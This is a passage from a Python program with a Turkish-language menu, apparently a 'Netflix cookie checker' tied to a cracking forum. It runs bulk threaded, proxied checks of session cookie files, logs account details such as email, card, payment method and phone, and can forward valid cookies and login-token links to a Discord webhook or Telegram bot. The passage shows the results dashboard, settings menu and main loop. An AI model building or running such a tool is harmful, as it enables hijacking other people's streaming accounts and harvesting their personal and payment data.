                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                    if plan_name:
                        plan_labels[plan_key] = plan_name
            elif result_type == "free":
                counts["free"] += 1
                if plan_key:
                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                    if plan_name:
                        plan_labels[plan_key] = plan_name
            elif result_type == "failed":
                counts["bad"] += 1
            elif result_type == "duplicate":
                counts["duplicate"] += 1
            else:
                counts["errors"] += 1

            cookies_left[0] -= 1
            update_title()

            if display_mode == "log":
                print_status_message(
                    result_type if result_type in {"success", "free", "failed", "duplicate", "error"} else "error",
                    cookie_file, result_country, plan_name, result_reason,
                )
            else:
                render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)

    update_title()

    def worker():
        while not stop_requested.is_set():
            try:
                cookie_name = cookie_files.pop(0)
            except IndexError:
                break
            process_cookie(cookie_name)

    threads = []
    for _ in range(num_threads):
        t_obj = threading.Thread(target=worker, daemon=True)
        threads.append(t_obj)

    try:
        for t_obj in threads:
            t_obj.start()
        while any(t_obj.is_alive() for t_obj in threads):
            for t_obj in threads:
                t_obj.join(timeout=0.2)
    except KeyboardInterrupt:
        stop_requested.set()
        t = get_theme()
        print(f"\n{t['warning']}{BOLD}⏳ Durduruluyor... lütfen bekleyin.{RE}")
        for t_obj in threads:
            t_obj.join(timeout=1)
        set_console_title("NetflixChecker - Durduruldu")
        return

    valid = counts["hits"] + counts["free"]
    set_console_title(f"NetflixChecker - Tamamlandı ✅{valid} ❌{counts['bad']} ⚠️{counts['errors']}")

    if bulk_mode and os.path.exists(bulk_temp_dir):
        shutil.rmtree(bulk_temp_dir, ignore_errors=True)

    if display_mode == "simple":
        render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)
        t = get_theme()
        print(f"\n{t['success']}{BOLD}✅ Kontrol tamamlandı!{RE}")
    else:
        t = get_theme()
        P = t["primary"]; A = t["accent"]; S = t["secondary"]
        G = t["success"]; E = t["error"]; W = t["warning"]; I = t["info"]
        BLUE = "\033[94m"
        W_ = 64
        print(f"\n\n{P}{BOLD}╔{'═' * W_}╗{RE}")
        print(f"{P}{BOLD}║{RE}  {A}{BOLD}📊  SONUÇ ÖZETİ{RE}{' ' * (W_ - 18)}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}╠{'═' * W_}╣{RE}")
        print(f"{P}{BOLD}║{RE}  {I}🔍 Kontrol:{RE}  {S}{BOLD}{cookies_total}{RE}{' ' * max(0, W_ - 16 - len(str(cookies_total)))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {G}✅ İyi    :{RE}  {S}{BOLD}{counts['hits']}{RE}{' ' * max(0, W_ - 16 - len(str(counts['hits'])))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {BLUE}🆓 Ücretsiz:{RE} {S}{BOLD}{counts['free']}{RE}{' ' * max(0, W_ - 16 - len(str(counts['free'])))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {E}❌ Kötü   :{RE}  {S}{BOLD}{counts['bad']}{RE}{' ' * max(0, W_ - 16 - len(str(counts['bad'])))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {A}🔁 Tekrar :{RE}  {S}{BOLD}{counts['duplicate']}{RE}{' ' * max(0, W_ - 16 - len(str(counts['duplicate'])))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {W}⚠️  Hata   :{RE}  {S}{BOLD}{counts['errors']}{RE}{' ' * max(0, W_ - 16 - len(str(counts['errors'])))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}╚{'═' * W_}╝{RE}")


# ── Settings Menu ──────────────────────────────────────────────

def settings_menu(config, config_source):
    config_yaml_path = "config.yml"

    def save_config():
        if yaml is None:
            t = get_theme()
            print(f"\n  {t['warning']}{BOLD}⚠️  PyYAML kurulu değil. Ayarlar kaydedilemedi.{RE}")
            return
        try:
            import copy as _copy
            cfg_to_save = _copy.deepcopy(config)
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                yaml.dump(cfg_to_save, f, allow_unicode=True, default_flow_style=False)
            t = get_theme()
            print(f"\n  {t['success']}{BOLD}✅ Ayarlar config.yml dosyasına kaydedildi!{RE}")
        except Exception as e:
            t = get_theme()
            print(f"\n  {t['error']}{BOLD}❌ Kaydetme hatası: {e}{RE}")

    while True:
        clear_screen()
        t = get_theme()
        P = t["primary"]; A = t["accent"]; S = t["secondary"]
        G = t["success"]; E = t["error"]; I = t["info"]; D = t["dim"]

        print_banner()

        notifications = config.get("notifications", {})
        webhook_cfg = notifications.get("webhook", {})
        telegram_cfg = notifications.get("telegram", {})
        nftoken_mode = get_nftoken_mode(config)
        display_mode = config.get("display", {}).get("mode", "simple")
        retry_attempts = config.get("retries", {}).get("error_proxy_attempts", 3)
        theme_name = THEMES.get(config.get("theme", "netflix"), {}).get("name", "Netflix Classic")

        wb_status  = f"{G}{BOLD}✅ AÇIK{RE}"  if webhook_cfg.get("enabled") else f"{E}{BOLD}❌ KAPALI{RE}"
        tg_status  = f"{G}{BOLD}✅ AÇIK{RE}"  if telegram_cfg.get("enabled") else f"{E}{BOLD}❌ KAPALI{RE}"
        nft_status = f"{G}{BOLD}✅ AÇIK{RE}"  if nftoken_mode != "false" else f"{E}{BOLD}❌ KAPALI{RE}"
        disp_label = f"{I}{BOLD}📊 Basit{RE}"  if display_mode == "simple" else f"{I}{BOLD}📋 Log{RE}"
        bulk_status = f"{G}{BOLD}✅ AÇIK{RE}" if config.get("bulk_mode", False) else f"{E}{BOLD}❌ KAPALI{RE}"

        W_ = 60
        def menu_row(num, icon, label, status="", extra=""):
            num_col = f"{A}{BOLD}[{num}]{RE}"
            label_col = f"{S}{icon} {label}{RE}"
            if status:
                row = f"  {P}{BOLD}║{RE}  {num_col}  {label_col:<45}{status}  {P}{BOLD}║{RE}"
            else:
                row = f"  {P}{BOLD}║{RE}  {num_col}  {label_col}  {P}{BOLD}║{RE}"
            print(row)

        print(f"  {P}{BOLD}╔{'═' * W_}╗{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}⚙️   AYARLAR MENÜSÜ{RE}{' ' * (W_ - 22)}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}╠{'═' * W_}╣{RE}")
        print(f"  {P}{BOLD}║{RE}  {I}🔔 Discord Webhook  →{RE} {wb_status}{'  ' * 10}     {P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {I}📨 Telegram Bot     →{RE} {tg_status}{'  ' * 10}     {P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {I}🔑 NFToken Linkleri →{RE} {nft_status}{'  ' * 10}     {P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}╠{'═' * W_}╣{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[1]{RE}  {S}🔔 Discord Webhook ayarları{RE}{' ' * 20}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[2]{RE}  {S}📨 Telegram Bot ayarları{RE}{' ' * 23}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[3]{RE}  {S}🔑 NFToken Aç/Kapat{RE}{' ' * 28}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[4]{RE}  {S}🖥️  Görüntüleme: {RE}{disp_label}{' ' * 25}   {P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[5]{RE}  {S}🔁 Yeniden Deneme: {retry_attempts} kez{RE}{' ' * 24}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[6]{RE}  {S}📦 Toplu Mod: {RE}{bulk_status}{' ' * 25}     {P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[7]{RE}  {S}📋 TXT Alan Ayarları{RE}{' ' * 27}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[8]{RE}  {S}🎨 Tema Değiştir: {theme_name}{RE}{' ' * max(0, 20 - len(str(theme_name)))}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[9]{RE}  {S}💾 Ayarları Kaydet (config.yml){RE}{' ' * 16}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}[0]{RE}  {S}◀  Geri Dön{RE}{' ' * 36}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}╚{'═' * W_}╝{RE}")
        print()

        choice = input(f"  {A}{BOLD}»{RE} Seçim: ").strip()

        if choice == "0":
            break

        elif choice == "1":
            clear_screen()
            print_banner()
            print(f"\n  {P}{BOLD}╔{'═' * 52}╗{RE}")
            print(f"  {P}{BOLD}║{RE}  {A}{BOLD}🔔 DİSCORD WEBHOOK AYARLARI{RE}{'  ' * 11}  {P}{BOLD}║{RE}")
            print(f"  {P}{BOLD}╚{'═' * 52}╝{RE}")
            print(f"\n  Durum    : {'✅ Açık' if webhook_cfg.get('enabled') else '❌ Kapalı'}")
            print(f"  URL      : {webhook_cfg.get('url') or '(boş)'}")
            print(f"  Mod      : {webhook_cfg.get('mode', 'full')}")
            print()
            print(f"  {A}{BOLD}[1]{RE} Webhook Aç/Kapat")
            print(f"  {A}{BOLD}[2]{RE} Webhook URL Gir")
            print(f"  {A}{BOLD}[3]{RE} Modu Değiştir (full/cookie/nftoken)")
            print(f"  {A}{BOLD}[0]{RE} Geri")
            print()
            sub = input(f"  {A}{BOLD}»{RE} Seçim: ").strip()
            if sub == "1":
                webhook_cfg["enabled"] = not webhook_cfg.get("enabled", False)
                config["notifications"]["webhook"] = webhook_cfg
                st = '✅ açıldı' if webhook_cfg['enabled'] else '❌ kapatıldı'
                print(f"\n  {G if webhook_cfg['enabled'] else E}{BOLD}Webhook {st}!{RE}")
                input("  Enter'a bas...")
            elif sub == "2":
                url = input("  Webhook URL: ").strip()
                if url:
                    webhook_cfg["url"] = url
                    config["notifications"]["webhook"] = webhook_cfg
                    print(f"  {G}{BOLD}✅ URL kaydedildi!{RE}")
                input("  Enter'a bas...")
            elif sub == "3":
                print("  Modlar: full | cookie | nftoken")
                mod = input("  Mod: ").strip().lower()
                if mod in ("full", "cookie", "nftoken"):
                    webhook_cfg["mode"] = mod
                    config["notifications"]["webhook"] = webhook_cfg
                    print(f"  {G}{BOLD}✅ Mod '{mod}' olarak ayarlandı!{RE}")
                else:
                    print(f"  {E}{BOLD}❌ Geçersiz mod!{RE}")
                input("  Enter'a bas...")

        elif choice == "2":
            clear_screen()
            print_banner()
            print(f"\n  {P}{BOLD}╔{'═' * 52}╗{RE}")
            print(f"  {P}{BOLD}║{RE}  {A}{BOLD}📨 TELEGRAM BOT AYARLARI{RE}{'  ' * 13}  {P}{BOLD}║{RE}")
            print(f"  {P}{BOLD}╚{'═' * 52}╝{RE}")
            print(f"\n  Durum    : {'✅ Açık' if telegram_cfg.get('enabled') else '❌ Kapalı'}")
            print(f"  Token    : {telegram_cfg.get('bot_token') or '(boş)'}")
            print(f"  Chat ID  : {telegram_cfg.get('chat_id') or '(boş)'}")
            print(f"  Mod      : {telegram_cfg.get('mode', 'full')}")
            print()
            print(f"  {A}{BOLD}[1]{RE} Telegram Aç/Kapat")
            print(f"  {A}{BOLD}[2]{RE} Bot Token Gir")
            print(f"  {A}{BOLD}[3]{RE} Chat ID Gir")
            print(f"  {A}{BOLD}[4]{RE} Modu Değiştir")
            print(f"  {A}{BOLD}[0]{RE} Geri")
            print()
            sub = input(f"  {A}{BOLD}»{RE} Seçim: ").strip()
            if sub == "1":
                telegram_cfg["enabled"] = not telegram_cfg.get("enabled", False)
                config["notifications"]["telegram"] = telegram_cfg
                st = '✅ açıldı' if telegram_cfg['enabled'] else '❌ kapatıldı'
                print(f"\n  {G if telegram_cfg['enabled'] else E}{BOLD}Telegram {st}!{RE}")
                input("  Enter'a bas...")
            elif sub == "2":
                token = input("  Bot Token: ").strip()
                if token:
                    telegram_cfg["bot_token"] = token
                    config["notifications"]["telegram"] = telegram_cfg
                    print(f"  {G}{BOLD}✅ Token kaydedildi!{RE}")
                input("  Enter'a bas...")
            elif sub == "3":
                cid = input("  Chat ID: ").strip()
                if cid:
                    telegram_cfg["chat_id"] = cid
                    config["notifications"]["telegram"] = telegram_cfg
                    print(f"  {G}{BOLD}✅ Chat ID kaydedildi!{RE}")
                input("  Enter'a bas...")
            elif sub == "4":
                mod = input("  Mod (full/cookie/nftoken): ").strip().lower()
                if mod in ("full", "cookie", "nftoken"):
                    telegram_cfg["mode"] = mod
                    config["notifications"]["telegram"] = telegram_cfg
                    print(f"  {G}{BOLD}✅ Mod '{mod}' ayarlandı!{RE}")
                else:
                    print(f"  {E}{BOLD}❌ Geçersiz mod!{RE}")
                input("  Enter'a bas...")

        elif choice == "3":
            cur = nftoken_mode
            new_val = False if cur != "false" else True
            config["nftoken"] = new_val
            st = f"{'açıldı (PC + Mobil)' if new_val else 'kapatıldı'}"
            t = get_theme()
            print(f"\n  {t['success'] if new_val else t['error']}{BOLD}🔑 NFToken linkleri {st}!{RE}")
            input("  Enter'a bas...")

        elif choice == "4":
            cur = config.get("display", {}).get("mode", "simple")
            new_mode = "log" if cur == "simple" else "simple"
            config.setdefault("display", {})["mode"] = new_mode
            label = "📊 Basit (Simple)" if new_mode == "simple" else "📋 Log"
            t = get_theme()
            print(f"\n  {t['info']}{BOLD}✅ Görüntüleme modu → {label}{RE}")
            input("  Enter'a bas...")

        elif choice == "5":
            try:
                val = int(input("  Yeniden deneme sayısı (1-10): ").strip())
                if 1 <= val <= 10:
                    config.setdefault("retries", {})["error_proxy_attempts"] = val
                    t = get_theme()
                    print(f"  {t['success']}{BOLD}✅ Yeniden deneme → {val} kez{RE}")
                else:
                    t = get_theme()
                    print(f"  {t['error']}{BOLD}❌ 1-10 arasında değer gir!{RE}")
            except ValueError:
                t = get_theme()
                print(f"  {t['error']}{BOLD}❌ Geçersiz değer!{RE}")
            input("  Enter'a bas...")

        elif choice == "6":
            config["bulk_mode"] = not config.get("bulk_mode", False)
            t = get_theme()
            status_str = f"{t['success']}{BOLD}✅ AÇIK{RE}" if config["bulk_mode"] else f"{t['error']}{BOLD}❌ KAPALI{RE}"
            print(f"\n  {t['accent']}{BOLD}📦 Toplu Mod →{RE} {status_str}")
            input("  Enter'a bas...")

        elif choice == "7":
            while True:
                clear_screen()
                t = get_theme()
                P2 = t["primary"]; A2 = t["accent"]; S2 = t["secondary"]
                G2 = t["success"]; E2 = t["error"]; I2 = t["info"]

                print_banner()
                print(f"\n  {P2}{BOLD}╔{'═' * 54}╗{RE}")
                print(f"  {P2}{BOLD}║{RE}  {A2}{BOLD}📋 TXT ALAN AYARLARI{RE}{'  ' * 15}  {P2}{BOLD}║{RE}")
                print(f"  {P2}{BOLD}╠{'═' * 54}╣{RE}")
                txt_fields = config.get("txt_fields", {})
                field_map = [
                    ("name", "İsim"), ("email", "E-Posta"), ("plan", "Plan"),
                    ("country", "Ülke"), ("member_since", "Üyelik Tarihi"),
                    ("quality", "Kalite"), ("max_streams", "Ekran Sayısı"),
                    ("next_billing", "Sonraki Ödeme"), ("payment_method", "Ödeme Yöntemi"),
                    ("card", "Kart"), ("phone", "Telefon"), ("hold_status", "Askı Durumu"),
                    ("extra_members", "Ekstra Üye"), ("email_verified", "E-Posta Onayı"),
                    ("membership_status", "Üyelik Durumu"), ("profiles", "Profiller"),
                    ("user_guid", "Kullanıcı GUID"),
                ]
                for idx, (key, label) in enumerate(field_map, 1):
                    status_icon = f"{G2}{BOLD}✅{RE}" if txt_fields.get(key, True) else f"{E2}{BOLD}❌{RE}"
                    print(f"  {P2}{BOLD}║{RE}  {A2}{BOLD}[{idx:>2}]{RE}  {status_icon}  {S2}{label:<32}{P2}{BOLD}║{RE}")
                print(f"  {P2}{BOLD}║{RE}  {A2}{BOLD}[ 0]{RE}  {S2}◀ Geri{RE}{'  ' * 19}  {P2}{BOLD}║{RE}")
                print(f"  {P2}{BOLD}╚{'═' * 54}╝{RE}")
                print()
                sub = input(f"  {A2}{BOLD}»{RE} Değiştirmek istediğin numara: ").strip()
                if sub == "0":
                    break
                try:
                    idx2 = int(sub) - 1
                    if 0 <= idx2 < len(field_map):
                        key2, label2 = field_map[idx2]
                        cur_val = txt_fields.get(key2, True)
                        config["txt_fields"][key2] = not cur_val
                        st2 = f"{G2}{BOLD}AÇIK{RE}" if not cur_val else f"{E2}{BOLD}KAPALI{RE}"
                        print(f"\n  {I2}{BOLD}'{label2}' →{RE} {st2}")
                        time.sleep(0.6)
                    else:
                        print(f"  {get_theme()['error']}{BOLD}❌ Geçersiz seçim!{RE}")
                        time.sleep(0.8)
                except ValueError:
                    print(f"  {get_theme()['error']}{BOLD}❌ Sayı gir!{RE}")
                    time.sleep(0.8)

        elif choice == "8":
            theme_menu(config)

        elif choice == "9":
            save_config()
            input("  Enter'a bas...")


# ── Main Menu ──────────────────────────────────────────────────

def main():
    create_base_folders()
    cleanup_stale_temp_files()
    config, config_source = load_config()

    # Load saved theme
    saved_theme = config.get("theme", "netflix")
    if saved_theme in THEMES:
        set_theme(saved_theme)

    clear_screen()
    print_banner()
    animated_loading("Başlatılıyor")
    check_for_updates()

    while True:
        clear_screen()

        t = get_theme()
        P = t["primary"]; A = t["accent"]; S = t["secondary"]
        G = t["success"]; E = t["error"]; I = t["info"]; D = t["dim"]

        print_banner()

        initial_files = [
            f for f in os.listdir(cookies_folder)
            if not f.startswith(".") and f.lower().endswith((".txt", ".json"))
        ]
        cookie_count = len(initial_files)
        proxies_loaded = 0
        if os.path.exists(proxy_file):
            with open(proxy_file, "r", encoding="utf-8") as _pf:
                proxies_loaded = sum(1 for ln in _pf if ln.strip() and not ln.strip().startswith("#"))

        notifications = config.get("notifications", {})
        wb_on  = notifications.get("webhook", {}).get("enabled")
        tg_on  = notifications.get("telegram", {}).get("enabled")
        nft_on = get_nftoken_mode(config) != "false"
        theme_name = THEMES.get(_current_theme_key, {}).get("name", "Netflix Classic")

        wb_str  = f"{G}{BOLD}✅ Açık{RE}"  if wb_on  else f"{E}{BOLD}❌ Kapalı{RE}"
        tg_str  = f"{G}{BOLD}✅ Açık{RE}"  if tg_on  else f"{E}{BOLD}❌ Kapalı{RE}"
        nft_str = f"{G}{BOLD}✅ Açık{RE}"  if nft_on else f"{E}{BOLD}❌ Kapalı{RE}"
        ck_col  = G if cookie_count > 0 else E
        px_col  = G if proxies_loaded > 0 else A

        W_ = 64

        # Status panel
        print(f"{P}{BOLD}╔{'═' * W_}╗{RE}")
        print(f"{P}{BOLD}║{RE}  {I}{BOLD}📊 DURUM PANELI{RE}{' ' * (W_ - 16)}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}╠{'═' * W_}╣{RE}")
        print(f"{P}{BOLD}║{RE}  {I}🍪 Cookie :{RE} {ck_col}{BOLD}{cookie_count} dosya{RE}         {I}🔌 Proxy :{RE} {px_col}{BOLD}{proxies_loaded} adet{RE}         {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {I}🔔 Webhook:{RE} {wb_str}            {I}📨 Telegram:{RE} {tg_str}       {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {I}🔑 NFToken:{RE} {nft_str}            {I}🎨 Tema    :{RE} {t['primary']}{BOLD}{theme_name}{RE}       {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}╠{'═' * W_}╣{RE}")

        # Menu items with glow
        print(f"{P}{BOLD}║{RE}                                                                  {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}   {G}{BOLD}[ 1 ]{RE}  {S}{BOLD}🎬  Netflix Cookie Kontrolü{RE}                          {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}                                                                  {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}   {A}{BOLD}[ 2 ]{RE}  {S}⚙️   Ayarlar & Tema{RE}                                  {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}                                                                  {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}   {I}{BOLD}[ 3 ]{RE}  {S}🎨  Tema Seçici{RE}                                      {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}                                                                  {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}   {E}{BOLD}[ 0 ]{RE}  {S}❌  Çıkış{RE}                                            {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}                                                                  {P}{BOLD}║{RE}")

        # Social links in menu
        print(f"{P}{BOLD}╠{'═' * W_}╣{RE}")
        print(f"{P}{BOLD}║{RE}  {A}💬{RE} {D}discord.gg/y759R26VUG{RE}  {A}📱{RE} {D}t.me/r2xzzs{RE}  {A}🌐{RE} {D}crackturkey.xyz{RE}          {P}{BOLD}║{RE}")
        print(f"{P}{BOLD}╚{'═' * W_}╝{RE}")
        print()

        choice = input(f"  {A}{BOLD}»{RE} Seçim: ").strip()

        if choice == "0":
            t2 = get_theme()
            print(f"\n  {t2['success']}{BOLD}👋 Görüşürüz! — @r2xzzs{RE}\n")
            break

        elif choice == "2":
            settings_menu(config, config_source)

        elif choice == "3":
            theme_menu(config)

        elif choice == "1":
            if cookie_count == 0:
                t2 = get_theme()
                print(f"\n  {t2['error']}{BOLD}❌ Cookies klasöründe cookie bulunamadı!{RE}")
                input("  Enter'a bas...")
                continue

            t2 = get_theme()
            P2 = t2["primary"]; A2 = t2["accent"]; S2 = t2["secondary"]; I2 = t2["info"]
            print(f"\n{P2}{BOLD}╔{'═' * 64}╗{RE}")
            print(f"{P2}{BOLD}║{RE}  {A2}{BOLD}⚙️  Thread Ayarı{RE}  {I2}(1-100, varsayılan: 10){RE}{' ' * 21}{P2}{BOLD}║{RE}")
            print(f"{P2}{BOLD}╚{'═' * 64}╝{RE}")
            try:
                num_threads_input = input(f"  {A2}{BOLD}»{RE} Thread sayısı: ")
                num_threads = int(num_threads_input) if num_threads_input.strip() else 10
                if num_threads < 1 or num_threads > 100:
                    raise ValueError
            except ValueError:
                t2 = get_theme()
                print(f"  {t2['warning']}{BOLD}⚠️  Varsayılan: 10 thread{RE}")
                num_threads = 10

            check_cookies(num_threads, config)
            t2 = get_theme()
            input(f"\n  {t2['success']}{BOLD}✅ Tamamlandı! Enter'a bas...{RE}")
        else:
            pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        t = get_theme()
        print(f"\n  {t['error']}{BOLD}🛑 Kullanıcı tarafından durduruldu.{RE}")